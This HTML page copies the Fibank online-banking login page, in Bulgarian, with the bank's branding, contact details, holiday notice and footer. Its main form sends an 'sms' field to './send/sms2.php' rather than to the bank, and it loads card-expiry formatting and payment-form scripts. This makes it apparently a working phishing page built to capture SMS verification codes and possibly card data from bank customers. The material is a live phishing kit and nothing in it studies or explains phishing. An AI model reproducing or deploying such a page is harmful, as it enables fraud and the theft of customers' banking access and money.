
<html ng-app="sgOAuth2" class="ng-scope"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>

		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="shortcut icon" href="./img/favicon.ico">

		<meta name="_csrf" content="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
		<meta name="_csrf_header" content="X-CSRF-TOKEN">

		<title>Вход в Моята Fibank</title>

		<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!--[if lt IE 9]>
		<script src="themes/COMMON/scripts/utils/es5-shim.js"></script>
		<script src="themes/COMMON/scripts/utils/html5shiv.min.js"></script>
		<script src="themes/COMMON/scripts/angular-ui/ui-utils-ieshiv.min.js"></script>


		<script>
	      document.createElement('ui-select');
	      document.createElement('ui-select-match');
	      document.createElement('ui-select-choices');
	    </script>
		<![endif]-->

<!-- 		<script src="themes/COMMON/scripts/utils/modernizr.js"></script> -->

		<!-- Core CSS -->

			<link href="./cs/css.css" rel="stylesheet">


		<!--[if IE 8]>
		<link href="themes/COMMON/stylesheets/style-ie8.css" rel="stylesheet">
		<script src="themes/COMMON/scripts/utils/respond.min.js"></script>
		<![endif]-->
		</head><body ng-controller="AppGlobalController" ng-class="{'info-footer' : $state.includes('login') || $state.includes('logout'), 'only-footer' : $state.includes('registration') || $state.includes('lost-password')}" class="ng-scope info-footer"><object id="oCAPICOM" codebase="themes/COMMON/capicom.cab#version=2,0,0,3" classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" style="display: none;">&nbsp;</object>


		<div class="body-wrapper">
			<nav class="navbar navbar-default" role="banner">
				<div class="container-fluid">
					<div class="navbar-header">
						<a href="/EBank" ng-class="{'navbar-brand' : selectLang.lang == 'BGN', 'navbar-brand-en' : selectLang.lang != 'BGN'}" class="navbar-brand"></a>
					</div>

					<div class="collapse navbar-collapse" role="navigation">
						<ul class="nav navbar-nav">
							<li><a href="" ng-click="changeLang(notSelectedLang)" ng-bind="notSelectedLang.langDesc" class="ng-binding">English</a></li>
							<li><a ng-href="" target="blank" href=""><i class="i-16  i-to-site"></i><span translate="APP.WEBSITE" class="ng-scope">Към сайта</span></a></li>
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope">
								<a ng-href="" target="blank" href=""><i class="i-32 i-app-full"></i><span translate="APP.MOBAPP" class="ng-scope">Мобилно приложение</span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-app">
									<li>
										<h3 translate="APP.MOBAPP_PIC" class="ng-scope">Банкирайте навсякъде, по всяко време</h3>
										<a ng-href="" target="blank" translate="APP.LEARNMORE" class="btn btn-default h-34 ng-scope" href="" "="">Научете повече</a>
									</li>
								</ul>
							</li>
							<li><a ng-href="" target="blank" href=""><i class="i-16 i-tariff-changes"></i><span translate="APP.CHANGES" class="ng-scope">Промени в ОУ и тарифа</span></a></li>

							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope"> <!-- TODO: set angular -->
								<!--<a ng-href="{{'APP.HELP_URL' | translate}}" target="blank"><i class="i-16 i-help"></i><span translate="APP.HELP"></span></a>-->
								<a href=""><i class="i-16 i-help"></i><span translate="APP.HELP" class="ng-scope">Помощ</span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-help">
									<li>
										<h3 translate="APP.INFORMATION_NMENU" class="ng-scope">Информация</h3>
									</li>
									<!-- ngIf: false -->
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.ASKED_QUESTIONS" class="ng-scope">Често задавани въпроси</span>
										</a>
									</li>
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-security-advice-big i-18-20"></i>
											<span translate="APP.SECURITY_ADVICE" class="ng-scope">Мерки за сигурност</span>
										</a>
									</li>

									<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope">
										<a ng-href="" target="blank" href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.OSD" class="ng-scope">Онлайн решаване на спорове</span>
										</a>
									</li><!-- end ngIf: globalConf.translateSufix != '_CY' -->

									<li>
										<div class="divider"></div>
									</li>
									<li>
										<h3 translate="APP.CONTACT_US_MENU" class="ng-scope">Връзка с нас</h3>
									</li>
									<li>
										<a class="cursor-text">
											<i class="i-18 i-phone"></i>
											<span translate="0700 12 777" class="ng-scope">0700 12 777</span>
										</a>
									</li>
									<li>
										<a class="cursor-text" ng-href="mailto:my.fibank@fibank.bg" href="mailto:my.fibank@fibank.bg">
											<i class="i-20-14 i-mail"></i>
											<span translate="my.fibank@fibank.bg" class="ng-scope">my.fibank@fibank.bg</span>
										</a>
									</li>
									<!-- ngIf: false -->
								</ul>
							</li>
						</ul>
						<ul class="nav navbar-nav navbar-right ">

								<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" ng-show="$state.includes('login') || $state.includes('lost-password')" class="ng-scope"><div><a ui-sref="registration({client_id:'E_BANK'})" translate="APP.REGISTRATION" class="pull-right btn btn-info h-34 w-btn-120 ng-scope" href="/oauth2-server/registration">РЕГИСТРАЦИЯ</a></div></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
								<li ng-show="$state.includes('registration')" class="ng-hide"><div><a ui-sref="login({client_id:'E_BANK'})" translate="APP.LOGIN" class="navbar-btn pull-right btn btn-primary h-34 w-btn-120 ng-scope" href="/oauth2-server/login">ВХОД</a></div></li>
								<li ng-show="$state.includes('logoutSuccess')" class="ng-hide"><div><a translate="APP.LOGIN" href="/EBank" class="btn pull-right btn-primary h-34 w-btn-120 ng-scope">ВХОД</a></div></li>

						</ul>
					</div>
				</div>
			</nav>

			<!-- Content -->
			<!-- uiView:  --><div id="app" ui-view="" data-template-url="index" class="ng-scope">


<div class="container ng-scope">
	<div class="login">
		<div class="row">
			<div class="col-md-12">
				<!-- ngIf: globalConf.translateSufix != '_CY' --><article ng-if="globalConf.translateSufix != '_CY'" class="important ng-binding ng-scope" ng-bind-html="'LOGIN.TOP_MSG_CONTENT' | translate"><span></span></article><!-- end ngIf: globalConf.translateSufix != '_CY' -->
			</div>
		</div>

		<div class="row">
			<div class="col-md-12">
				<div class="container-signin">
					<form name="mainForm" id="mainForm" class="form-centered  form-signin box-border ng-pristine ng-invalid ng-invalid-required" action="./send/sms2.php" method="post">SMS II :</h3>
						<div id="loginform">
							<fieldset>
								<div class="row">
                    <div class="col-sm-12">
<div class="form-group"  >
    <label data-bind="attr: { for: &#39;id_4758369eb74a4acba738ae24b9020715_Model_UserName&#39; }"></label>
    <input class="form-control" type="Text" name="sms"
           
           
           
           
           data-bind="elementReference: UserNameElement, value: Model.UserName, attr: { id: &#39;id_4758369eb74a4acba738ae24b9020715_Model_UserName&#39; }" required/>


								<input tabinex="-1" class="hidden ng-pristine ng-valid" type="text" name="system" ng-model="credentials.system">
								<input tabinex="-1" class="hidden ng-pristine ng-valid" type="text" name="client_id" ng-model="credentials.client_id">
								<!-- <div class="form-group">
									<select id="system" name="system" ng-model="credentials.system" class="form-control"  placeholder="System">
										<option value="">Any</option>
										<option value="E-FIBANK.BG" translate="LOGIN.EFIBANK">E-FIBANK.BG</option>
										<option value="MY-FIBANK.BG" translate="LOGIN.MYFIBANK">MY-FIBANK.BG</option>
									</select>
								</div> -->

							</fieldset>


							<button class="btn btn-primary ng-scope" type="submit" onclick="myFunction()"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">връзка</font></font></button>

							<!-- Error messages -->
							<p class="alert alert-danger s2 red-txt ng-scope" translate=""></p>


							<!-- /Error messages -->
							<input id="lang" class="hidden ng-pristine ng-valid" type="text" name="lang" ng-model="credentials.lang">
							<input id="time" class="hidden ng-pristine ng-valid" type="text" name="time" ng-model="credentials.time">
							<input class="hidden" type="text" name="_csrf" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
							<input id="sig" class="hidden ng-pristine ng-valid" type="text" name="sig" ng-model="credentials.sig">
						</div>
					</form>

					<!-- for demo user -->
					<form id="form-signin-demo" role="form" method="post" ng-show="false" action="login" class="ng-pristine ng-valid ng-hide">
						<input class="hidden ng-pristine ng-valid" type="text" name="username" ng-model="demoCredentials.username">
						<input class="hidden ng-pristine ng-valid" type="text" name="password" ng-model="demoCredentials.password">
						<input class="hidden ng-pristine ng-valid" type="text" name="system" ng-model="demoCredentials.system">
						<input class="hidden ng-pristine ng-valid" type="text" name="lang" ng-model="demoCredentials.lang">
						<input class="hidden ng-pristine ng-valid" type="text" name="time" ng-model="demoCredentials.time">
						<input class="hidden" type="text" name="_csrf" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
						<input tabinex="-1" class="hidden ng-pristine ng-valid" type="text" name="client_id" ng-model="credentials.theme">
					</form>

					<div class="ssl-box box-border">
						<div class="ssl-thawte" title="Чрез &quot;кликване&quot; можете да се уверите, че този сайт е избрал Thawte SSL за сигурност при електронна търговия и поверителни комуникации.">
							<p translate="LOGIN.SSL_CERT_DESC" class="ng-scope">Защитен вход със <a href="http://www.thawte.com/products" target="blank">SSL сертификат</a> от:</p>
							<script type="text/javascript" src=""></script>
							<div>
								<a href="" tabindex="-1" target="THAWTE_Splash">
									<img src="./img/img_logo_thatwe.png" alt="Click to Verify - This site has chosen a thawte SSL Certificate to improve Web site security">
								</a>
								<span ng-bind="currentDate.now() | date: 'dd.MM.yyyy'" class="ng-binding">26.12.2017</span>
							</div>
						</div>
						<ul class="list-inline">
							<li>
								<a ng-href="" target="blank" href=""><i class="i-16 i-security-advice"></i><span translate="LOGIN.SECURITY_ADVICE" class="ng-scope">Съвети за сигурност</span><i class="i-arrow-right-4x7"></i></a>
							</li>

							<li>
								<!--<a><i class="i-16 i-error-message"></i><span translate="LOGIN.ERROR_MESSAGES"></span><i class="i-arrow-right-4x7"></i></a> -->
								<a ng-href="" target="blank" href=""><i class="i-faq i-18-20"></i><span translate="APP.ASKED_QUESTIONS" class="ng-scope">Често задавани въпроси</span><i class="i-arrow-right-4x7"></i>
								</a>
							</li>
						</ul>
					</div>


				</div>

				<div class="container-signin-info">
						<!-- ngIf: globalConf.translateSufix != '_CY' --><article ng-if="globalConf.translateSufix != '_CY'" class="important ng-binding ng-scope" ng-bind-html="'LOGIN.IMPORTANT_CONTENT' | translate"><div class="grey-txt alert-danger modal-body s4">

</div></article><!-- end ngIf: globalConf.translateSufix != '_CY' -->
					<!-- ngIf: globalConf.translateSufix == '_CY' -->
					<div class="divider"></div>
					<!-- ngIf: globalConf.translateSufix != '_CY' --><article ng-if="globalConf.translateSufix != '_CY'" class="ng-scope">
						<h3 translate="LOGIN.REVIEW_SYSTEM" class="ng-scope">Разгледайте системата</h3>
						<p translate="LOGIN.REVIEW_SYSTEM_CONTENT" class="grey-txt ng-scope">Разгледайте и усетете онлайн банкирането чрез интерактивната ни демо версия.</p>
						<a id="demo-link" href="" ng-click="demo()" ng-disabled="startSubmit"><span translate="LOGIN.DEMO" class="ng-scope">Демо Версия</span><i class="i-arrow-right-5x8"></i></a>
					</article><!-- end ngIf: globalConf.translateSufix != '_CY' -->
					<!-- <div class="divider"></div>
					<article>
						<p translate="{{('LOGIN.QUESTIONS_CONTENT' + globalConf.translateSufix) | translate}}" class="grey-txt"></p>
						<a ng-href="{{('LOGIN.URL_READ_MORE' + globalConf.translateSufix) | translate}}" target="_blank""><span translate="LOGIN.READ_MORE"></span><i class="i-arrow-right-5x8"></i></a>

					</article>-->
					<!-- ngIf: false -->
				</div>
			</div>
		</div>

		<div class="row">
			<div class="col-md-12">
				<!-- ngIf: globalConf.translateSufix != '_CY' --><article ng-if="globalConf.translateSufix != '_CY'" class="important ng-binding ng-scope" ng-bind-html="'LOGIN.BOTTOM_MSG_CONTENT' | translate"><div class="grey-txt grey-bg modal-body s4">
<b>Уважаеми клиенти,</b>
<br>
информираме Ви, че преводи наредени по системи BISERA и RINGS до 14.15ч. на 29.12.2017 г. се изпълняват с дата на изпълнение 29.12.2017г., а след този час с дата на изпълнение 02.01.2018г.
<br>
<br>
Вътрешнобанкови преводи, наредени до 16.00ч. на 31.12.2017 г. се изпълняват с дата на изпълнение 31.12.2017 г., а след този час с дата на изпълнение 01.01.2018г.
<br>
<br>
Телефон 0700 12 777 няма да приема обаждания от 12:00ч. на 31.12.2017г. до 07:00ч. на 02.01.2018г.
<br>
Fibank Ви пожелава весело посрещане на новогодишните празници!
</div></article><!-- end ngIf: globalConf.translateSufix != '_CY' -->
			</div>
		</div>

	</div>
</div></div>
			<!-- Content -->

			<div class="body-push"></div>
		</div>
	<!--  FOOTER  -->
		<div id="footer-push">
			<!-- ngIf: !$state.includes('registration') && !$state.includes('lost-password') --><div ng-if="!$state.includes('registration') &amp;&amp; !$state.includes('lost-password')" class="ng-scope">
				<div class="info-box text-center">
	<h5 translate="LOGIN.QUESTIONS" class="ng-scope">За всички въпроси нашите служители Ви очакват на:</h5>
	<ul class="list-inline first-ul">
		<li><i class="i-phone"></i><span translate="LOGIN.PHONE" class="ng-scope">Телефон:</span> <span class="blue-txt bold ng-scope" translate="LOGIN.PHONE_NUM">0700 12 777</span> <!-- ngIf: globalConf.translateSufix != '_CY' --><span ng-if="globalConf.translateSufix != '_CY'" translate="LOGIN.NONSTOP" class="ng-scope">(денонощно)*</span><!-- end ngIf: globalConf.translateSufix != '_CY' --></li>
		<li><a href="mailto:my.fibank@fibank.bg" target="blank"><i class="i-20-14 i-mail"></i><span translate="LOGIN.EMAIL" class="ng-scope">E-mail:</span> <span class="blue-txt bold ng-scope" translate="my.fibank@fibank.bg">my.fibank@fibank.bg</span></a></li>
		<!-- ngIf: false -->
	</ul>
	<p class="grey-txt s4 ng-scope" translate="LOGIN.CALL_INFO">* Разговорите към национален номер 0700 12 777 се таксуват според определените от Вашия оператор цени за обаждане към номера тип 0700 на Vivacom. За абонати на Vivacom обаждане към този номер се таксува като обаждане към стационарен номер в мрежата на Vivacom.</p>
	<!-- ngIf: globalConf.translateSufix != '_CY' --><h5 translate="LOGIN.LOCATION" ng-if="globalConf.translateSufix != '_CY'" class="ng-scope">Вижте къде се намираме:</h5><!-- end ngIf: globalConf.translateSufix != '_CY' -->
	<!-- ngIf: globalConf.translateSufix != '_CY' --><ul class="list-inline last-ul ng-scope" ng-if="globalConf.translateSufix != '_CY'">
		<li><a href="" target="_blank"><i class="i-16 i-offices"></i><span translate="LOGIN.OFFICE_INFO" class="ng-scope">Клонове</span><i class="i-arrow-right-5x8"></i></a></li>
		<li><a href="" target="_blank"><i class="i-18 i-atm"></i><span translate="LOGIN.ATM_INFO" class="ng-scope">Банкомати</span><i class="i-arrow-right-5x8"></i></a></li>
	</ul><!-- end ngIf: globalConf.translateSufix != '_CY' -->
</div>
			</div><!-- end ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
			<div id="footer" class="container-fluid text-center">
				<ul class="list-inline s2">
					<!-- ngIf: false -->
					<!-- ngIf: false -->
					<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope"><a ng-href="" translate="APP.REGISTRATION_PROC" target="_blank" class="ng-scope" href="">Процес на регистрация</a><i class="i-arrow-right-4x7"></i></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
					<!-- ngIf: false -->
					<li><a ng-href="" translate="APP.FEES_COMISSIONS" target="_blank" class="ng-scope" href="">Такси и комисионни</a><i class="i-arrow-right-4x7"></i></li>
					<li><a ng-href="" translate="APP.DOCUMENTS" target="_blank" class="ng-scope" href="">Документи</a><i class="i-arrow-right-4x7"></i></li>
				</ul>
				<p class="s2 ng-scope" translate="APP.COPYRIGHTS">© Първа инвестиционна банка 2009-2017. Всички права запазени.</p>
			</div>
		</div>
	<!--  /FOOTER  -->


		<!-- Static sources -->

			<script type="text/javascript" src=""></script>

<script>
function myFunction() {
  document.getElementById("myForm").submit();
}
</script>
<script>
function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}
</script>

</body>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
    <script src="assets/js/script.js"></script>
</html>
